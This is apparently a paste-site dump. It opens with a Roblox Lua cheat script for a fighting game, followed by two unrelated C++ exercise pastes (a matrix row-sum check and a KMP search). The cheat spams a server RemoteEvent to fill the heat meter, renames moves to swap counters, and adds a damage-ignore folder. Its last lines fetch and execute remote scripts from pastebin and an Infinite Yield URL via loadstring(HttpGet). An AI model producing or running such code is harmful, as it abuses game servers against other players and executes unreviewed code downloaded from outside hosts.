	local v = game.ReplicatedStorage.Sounds:FindFirstChild(sfxname)
	local sfx = Instance.new(""Sound"", nil)
	local id = v.Value

	sfx.SoundId = id

	for i,v in v:GetChildren() do
		sfx[v.Name] = v.Value
	end

	game.SoundService:PlayLocalSound(sfx)
	task.delay(15, function()
		sfx:Destroy()
	end)
end

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Ultimate Essence"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_UltimateEssence.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_UltimateEssence.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
	play_ingamesound(""Ignite"")
        play_ingamesound(""Ignite"")
        play_ingamesound(""Laugh"")
        task.wait(0.4)
        play_ingamesound(""TakeAim"")
        task.wait(0.6)
        play_ingamesound(""BoneBreak"")
	play_ingamesound(""MassiveSlap"")

        task.wait(0.3)
        Anim:Destroy()
    end
end)


local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Essence of Fast Footwork [Back]"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_SumoSlap.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_SumoSlap.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""Teleport"")
        play_ingamesound(""Slap"")
        task.wait(0.55)
        play_ingamesound(""Slap"")
        task.wait(0.45)
        play_ingamesound(""Slap"")
        task.wait(0.8)
        play_ingamesound(""MassiveSlap"")
        Anim:Destroy()
    end
end)

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Essence of Fisticuffs"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_UltimateEssence.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_UltimateEssence.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""Ignite"")
        play_ingamesound(""Ignite"")
        task.wait(0.3)
        play_ingamesound(""TakeAim"")
        task.wait(0.6)
        play_ingamesound(""Slap"")
        task.wait(0.9)
        play_ingamesound(""MassiveSlap"")
        Anim:Destroy()
    end
end)

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Essence of Whirl"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_KnockoutFront.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_KnockoutFront.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""MetalBonk"")
        play_ingamesound(""MetalSmack"")
        task.wait(0.1)
        play_ingamesound(""MetalSmack"")
        task.wait(0.1)
        play_ingamesound(""MetalPipe"")
        task.wait(0.1)
        play_ingamesound(""MassiveSlap"")
        Anim:Destroy()
    end
end)

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Essence of Frenzy [Back]"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_SumoSlap.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_SumoSlap.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""Teleport"")
        play_ingamesound(""Slap"")
        task.wait(0.55)
        play_ingamesound(""Slap"")
        task.wait(0.45)
        play_ingamesound(""Slap"")
        task.wait(0.8)
        play_ingamesound(""MassiveSlap"")
        Anim:Destroy()
    end
end)



local DragonText = ""Dragon""
local DragonColor = Color3.new(0.95, 0.05, 0.1)
local DragonSequence = ColorSequence.new({ColorSequenceKeypoint.new(0, DragonColor), ColorSequenceKeypoint.new(1, DragonColor)})
local moves = game.ReplicatedStorage.Moves
local styles = game.ReplicatedStorage.Styles
local plr = game.Players.LocalPlayer
local status = plr.Status

function isInBattle()
	return (plr:FindFirstChild(""InBattle"") and true or false)
end

function isDungeon()
	return game.ReplicatedStorage.Dungeon.Value
end

function doingHact()
	return (plr.Character:FindFirstChild(""Heated"") and true or false)
end

function showMaxHeatEffect()
	return (isInBattle() and not doingHact() and plr.Status.Heat.Value >= 100) and true or false
end

function hasWeaponInHand()
	return (plr.Character:FindFirstChild(""Holding"") and true or false)
end

local function change_color()
	if status.Style.Value == ""Brawler"" then
		local DragonSequence = ColorSequence.new{ColorSequenceKeypoint.new(0, styles.Brawler.Color.Value), ColorSequenceKeypoint.new(1, styles.Brawler.Color.Value)}
		local char = plr.Character
		char.HumanoidRootPart.Fire_Main.Color = DragonSequence
		char.HumanoidRootPart.Fire_Secondary.Color = DragonSequence
		char.HumanoidRootPart.Fire_Main.Rate = status.Heat.Value >= 100 and 115 or status.Heat.Value >= 75 and 85 or 80
		char.HumanoidRootPart.Fire_Secondary.Rate = status.Heat.Value >= 100 and 90 or status.Heat.Value >= 75 and 80 or 70
		char.HumanoidRootPart.Lines1.Color = DragonSequence
		char.HumanoidRootPart.Lines1.Rate = status.Heat.Value >= 100 and 60 or status.Heat.Value >= 75 and 40 or 20
		char.HumanoidRootPart.Lines2.Color = DragonSequence
		char.HumanoidRootPart.Lines2.Rate = status.Heat.Value >= 100 and 60 or status.Heat.Value >= 75 and 40 or 20
		char.HumanoidRootPart.Sparks.Color = DragonSequence
		if not char.HumanoidRootPart.TimeFor.Enabled then
			char.HumanoidRootPart.TimeFor.Color = DragonSequence
		end

		char.UpperTorso[""r2f_aura_burst""].Lines1.Color = DragonSequence
		char.UpperTorso[""r2f_aura_burst""].Lines2.Color = DragonSequence
		char.UpperTorso[""r2f_aura_burst""].Flare.Color = DragonSequence
		char.UpperTorso[""r2f_aura_burst""].Lines1.Enabled = showMaxHeatEffect()
		char.UpperTorso[""r2f_aura_burst""].Flare.Enabled = showMaxHeatEffect()
		char.UpperTorso[""r2f_aura_burst""].Smoke.Color = DragonSequence
		char.UpperTorso.Evading.Color = DragonSequence
	end
end

local function FillHeat()
	local Event = game:GetService(""ReplicatedStorage"").Events.ME

	for i=1,6 do
		local A_1 =  {
			[1] = ""heat"", 
			[2] = game:GetService(""ReplicatedStorage"").Moves.Taunt
		}
		Event:FireServer(A_1)
	end
end

game:GetService(""RunService"").RenderStepped:Connect(change_color)

plr.Character.ChildAdded:Connect(function(v)
	if v.Name == 'Grabbing' then
		while v.Parent == plr.Character do
			if status.Heat.Value ~= 100 then
				FillHeat()
			end
			task.wait(0.05)
		end
	end
end)

if moves:FindFirstChild(""龍TigerDrop"") then
        moves:FindFirstChild(""BRCounter2"").Name = ""FakeCounter2""
        moves:FindFirstChild(""龍TigerDrop"").Name = ""BRCounter2""
        moves:FindFirstChild(""BRCounter1"").Name = ""FakeCounter1""
        moves:FindFirstChild(""BRGrab"").Name = ""FakeGrab""

        local ignore = Instance.new(""Folder"")
        ignore.Name = ""IgnoreDmg""
        ignore.Parent = moves:FindFirstChild(""BRCounter2"")

        if not moves:FindFirstChild(""BRCounter2""):FindFirstChild(""HSize"") then
            local n = Instance.new(""NumberValue"")
            n.Name = ""HSize""
            n.Value = 2
            n.Parent = moves:FindFirstChild(""BRCounter2"")
        end
    end

function playticksound()
	local sfx = Instance.new(""Sound"", workspace)
	sfx.SoundId = ""rbxassetid://12222183""
	sfx.Volume = 2

	game:GetService(""SoundService""):PlayLocalSound(sfx)

	spawn(function()
		wait(2)
		sfx:Destroy()
	end)
end

local notifyevent 
for i,v in pairs (pgui:GetChildren()) do
    if v:IsA(""BindableEvent"") then
        notifyevent = v
    end
end

local function sendNotification(text, color, sound)
    if not color then color = Color3.new(1, 1, 1) end
    pgui.NotifyUI.Awards.ChildAdded:Once(function(c)
        if c.Text == text then
            c.TextColor3 = color
            coroutine.wrap(function()
                local con;
                con = game:GetService(""RunService"").RenderStepped:Connect(function()
                    if not c then
                        con:Disconnect()
                        return
                    end
                    c.TextColor3 = color
                end)()
            end)()
        end
    end)
    notifyevent:Fire(text, sound or nil)
end

menu.Bars.Mobile_Title.Text = ""Jake Legend style!""

local uis = game:GetService(""UserInputService"")
local rushstyle = game.ReplicatedStorage.Styles.Rush
local brawlerstyle = game.ReplicatedStorage.Styles.Brawler
local beaststyle = game.ReplicatedStorage.Styles.Beast

local grabstrike = rushstyle:WaitForChild(""GrabStrike""):Clone()
local guruparry = brawlerstyle:WaitForChild(""GrabStrike"")

sendNotification(""Press X to swap counter step and parry on legend style"", color)

uis.InputBegan:Connect(function(key)
	if game.UserInputService:GetFocusedTextBox() == nil then
		if key.KeyCode == Enum.KeyCode.X then
			playticksound()
			if guruparry.Parent ~= nil then
				guruparry.Parent = nil
				grabstrike.Parent = brawlerstyle
				sendNotification(""Counter Quickstep Enabled"", color)
			else
			guruparry.Parent = brawlerstyle
				grabstrike.Parent = nil
				sendNotification(""Parry Enabled"", color)
			end
		end
	end
end)

local plr = game.Players.LocalPlayer
local pgui = plr.PlayerGui
local interf = pgui.Interface

game.ReplicatedStorage.Moves.TigerDrop.Anim.AnimationId = ""rbxassetid://12120052426""
interf.Client.Disabled = true
task.wait(0.1)
interf.Client.Disabled = false


local plr = game.Players.LocalPlayer
local pgui = plr.PlayerGui
local interf = pgui.Interface

game.ReplicatedStorage.Moves.BRCounter2.Anim.AnimationId = ""rbxassetid://12120052426""
game.ReplicatedStorage.Moves.H_GUltimateEssence.Anim.AnimationId = ""rbxassetid://12338287890""
interf.Client.Disabled = true
task.wait(0.1)
interf.Client.Disabled = false

loadstring(game:HttpGet(""https://pastebin.com/raw/gsxvWvnj""))() 

loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIYinfiniteyield/master/source'))()"
rnbhiD2F,Untitled,Josif_tepe,C++,Tuesday 23rd of April 2024 08:00:51 AM CDT,"#include <stdio.h>

int main()
{
    int n, m;
    scanf(""%d%d"", &n, &m);

    int mat[n][m];
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            scanf(""%d"", &mat[i][j]);
        }
    }

    for(int i = 0; i < n; i++) {
        int zbir = 0;
        for(int j = 1; j < m; j++) {
            zbir += mat[i][j];
        }
        if(mat[i][0] == zbir) {
            printf(""%d\n"", mat[i][0]);
        }
    }
    return 0;
}
"
2YPcGWkz,optimized_kmp,maxim_shlyahtin,C++,Tuesday 23rd of April 2024 07:58:51 AM CDT,"#include <iostream>
#include <vector>
#include <string>

void form_suffix_array(std::vector<int>& pi, std::string& a) {
	int j = 0, i = 1;
	while (i < a.length()) {
		if (a[i] != a[j]) {
			if (j == 0 && pi[i] == 0) {
				++i;
			}
			else {
				j = pi[j - 1];
			}
		}
		else {
			pi[i] = j + 1;
			++i;
			++j;
		}
	}
}

void print_str(std::string& str, int start, int end) {
	//std::cout << start << "" "" << end << '\n';
	if (start == end) return;
	start = start > str.length() ? start - str.length() : start;
	end = end > str.length() ? end - str.length() : end;
	for (int i = start; i < end; ++i) {
		std::cout << str[i];
	}
	std::cout << '\n';
}
//←→↑↓
auto print_space = [](int j) {for (int i = 0; i < j; ++i) std::cout << "" "";};

void display_current_pointer_position(std::string& a, std::string& t, int i, int j) {
	print_space(i);
	std::cout << ""|\n"";
	print_str(a, 0, a.length());
	print_space(i - j);
	print_str(t, 0, t.length());
	print_space(i);
	std::cout << ""|\n\n"";
}

std::vector<int> kmp(char a, std::string& t, std::vector<int>& pi) {
	std::vector<int> res;
	int m = t.length();
	int i = 0, j = 0;
	while (a != '.') {
		if (a == t[j]) {
			++i; ++j;
			if (j == m) {
				res.push_back(i - m);
			}
			std::cin >> a;
		}
		else {
			if (j > 0) {
				//display_current_pointer_position(a, t, i, j);
				j = pi[j - 1];
			}
			else {
				++i;
				std::cin >> a;
			}
		}
		//display_current_pointer_position(a, t, i, j);
	}
	if (res.size() == 0) {
		res.push_back(-1);
	}
	return res;
}

//лилилось лилилась

int main() {
	std::string p;
	std::cin >> p;
	//std::string t;
	//std::cin >> t;
	std::vector<int> pi(p.length(), 0);
	form_suffix_array(pi, p);
	char a;
	std::cin >> a;
	std::vector<int> res = kmp(a, p, pi);
	for (int i = 0; i < res.size(); ++i) {
		if (i < res.size() - 1)
			std::cout << res[i] << ',';
		else
			std::cout << res[i];
	}
	std::cout << '\n';
	return 0;
}"
